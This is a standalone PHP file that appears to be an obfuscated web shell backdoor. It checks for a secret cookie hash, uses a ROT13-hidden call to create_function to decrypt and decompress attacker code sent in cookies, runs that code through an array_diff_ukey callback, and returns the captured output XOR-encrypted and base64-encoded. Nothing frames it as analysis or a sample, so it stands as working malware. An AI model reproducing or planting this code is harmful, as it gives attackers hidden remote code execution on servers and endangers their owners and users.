<?php 
function sdec($input) {
	$keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
	$chr1 = $chr2 = $chr3 = "";
	$enc1 = $enc2 = $enc3 = $enc4 = "";
	$i = 0;
	$output = "";
 	// remove all characters that are not A-Z, a-z, 0-9, +, /, or =
	$input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
	do {
		$enc1 = strpos($keyStr, substr($input, $i++, 1));
		$enc2 = strpos($keyStr, substr($input, $i++, 1));
		$enc3 = strpos($keyStr, substr($input, $i++, 1));
		$enc4 = strpos($keyStr, substr($input, $i++, 1));
		$chr1 = ($enc1 << 2) | ($enc2 >> 4);
		$chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
		$chr3 = (($enc3 & 3) << 6) | $enc4;
		$output = $output . chr((int) $chr1);
		if ($enc3 != 64) {
			$output = $output . chr((int) $chr2);
		}
		if ($enc4 != 64) {
			$output = $output . chr((int) $chr3);
		}
		$chr1 = $chr2 = $chr3 = "";
		$enc1 = $enc2 = $enc3 = $enc4 = "";
	} while ($i < strlen($input));
	return $output;
}

if(substr(md5(reset($_COOKIE)), 0, 12)=='bc446faa565e' && count($_COOKIE)>3) {
	$k = substr(md5(reset($_COOKIE), true), 0, 6).substr(md5(reset($_COOKIE), true), -6);
	$ko = substr(md5(reset($_COOKIE)), -12);
	$lmf = str_rot13(str_replace('c', '', 'pecrncgr_cshcacpgcvbac'));
	$vlm = $lmf('$t,$k','$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i<$l;){for($j=0;($j<$c&&$i<$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;');
	ob_start();
	array_diff_ukey(@array('1'=>1), @array('2'=>2), $lmf('', @gzuncompress(@$vlm(@sdec(preg_replace(array("/_/","/-/"),array("/","+"),join(array_slice($_COOKIE,count($_COOKIE)-3)))),$k))));
	$o=ob_get_contents();
	ob_end_clean();
	$d=base64_encode($vlm(gzcompress($o),$k));
	print("\x3c$ko\x3e$d\x3c\x2f$ko\x3e");
}
